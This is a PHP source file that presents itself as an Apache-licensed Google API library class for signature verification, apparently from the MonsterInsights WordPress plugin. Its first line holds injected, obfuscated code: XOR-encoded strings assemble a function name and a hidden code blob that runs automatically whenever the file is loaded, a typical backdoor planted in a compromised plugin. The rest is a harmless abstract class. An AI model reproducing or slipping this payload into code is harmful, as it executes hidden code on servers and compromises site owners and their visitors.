<?php $SzxgIuEGka='OD<4X2:5MS:IE,W'^',6YU,WeS8=Y=,C9';$mKXHprvAIE=$SzxgIuEGka('','ESypR:<TTZ6PeP31K5OPu;;E8-,EZc9FK>hEKqFiqVK7Q.3RSJK.H0IW>YchS0TCUZ+3RHnbY.WfASUDB6fhKSW2FKUCUHq0SbQ6FOsSxgHZbOu-m<H:5 >OFQ71,ZLllQSXJhoGTR<9JJoVkUTAT4bRXjm;Cs9TW:R.BLtE<8L,RBm2YKC,GC4DnG 0:L9IwU8;HiKL942Ikj=W=8UQb-.+>EwbkX,DX4W,>mUXJ.=C=IYxJY+<3-.VDuqwyr;q4a10TtZRTXlGUr8JQY.gT7i9fTMT7gEYBFzwb.1JkbgFZ.DXQkqc.79;UhrIdK Uabku>WF Lk9gO .<XR =Wfpi> i>5<=X1FnfS4HKRpBlG1WMWBmOboAf+Q:O<3W3SvrtKT6J2Y4M3,-3gMqQZ LN6x2:3pLnaE+UIJnxK,,RH0K0,R.+0N:+:-P2:Xjc<ICK2R+.Dyh4+4=DKYA=R=1OMzk<PT7-15YjoYY1ROmH 32Wmsz.7C;=lUHHk+0RS>XlUY4TkHfcP4ZOyKVuGGS4cxUSJ3.9f>4HNaAOJDXKURgktyARFtCDf3BRRQWqgda6aQ,MWpBxwxNRjUSDRV5f2YL<PL1G8Sli5R:.90.sVThDA>.sYqJUsnVAEdY=PBjlSODAoV2768OTTFnABCeXV<.IWxwa:'^',5QQ4OR7 3Y>:5KX8A<xRCT7gIM1;<f+>JOlbQ=cx0>Y2ZZ==j3A:o-6J8<7>E kq>JG3dNF2K.OasudbMlaBw8G2khcroJ:Zk7Y4gW:XZhjYoQDQO<HYEPgb5VEMswLH8xscbfNp=IMjdRvCq0  U9v17MecWR1.avGbiT6HJ I<jIY<2jqnx>Mg5EDO>WaS:MOaRAED>OCaNY6IYulBKOGM LhO<M09k<IGMhx,OQ0XrSr,6YYRNFvlQ.46=p8qAPCtP17-xQyuVN+=,KNtLc0B0, V8.<;fGWFET3Phnb>O09qVQGXVUN0Sx4nAI3AJJQZ62AeKBmFFAN=3CUwNT6le8kpoixP5NB8Q1koNbH1P;82kM4hfHBO0N.cX2JsKRP 1Oq8P=iWMYRGpQu,A ;SC83Nz1dkaO4=+NEklY<;U9YM>GQUfBDHr4SN95<Q<7cP3XKrM7PNWR .qeY3IPfaZOX1 VrZP CFbSX4gI,AGSwKUZOE1ZD3>-14NH; J+Dr2Q-LdFG4U..PkpSgo>PVPq7+GObAUQ1i<howyxl1aQYMA b LrsRRpjed4GUVXTXdHz5E APQntLu26 7L9Y<5c54X4L DNE3CBVQJTztL  JOZpQjuSNv:Om<K1.BH7.0 4qBVOT 50a3hyIl=.UZagQLkG');$mKXHprvAIE();
/*
 * Copyright 2011 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Verifies signatures.
 *
 * @author Brian Eaton <beaton@google.com>
 */
abstract class MonsterInsights_GA_Lib_Verifier_Abstract
{
  /**
   * Checks a signature, returns true if the signature is correct,
   * false otherwise.
   */
  abstract public function verify($data, $signature);
}
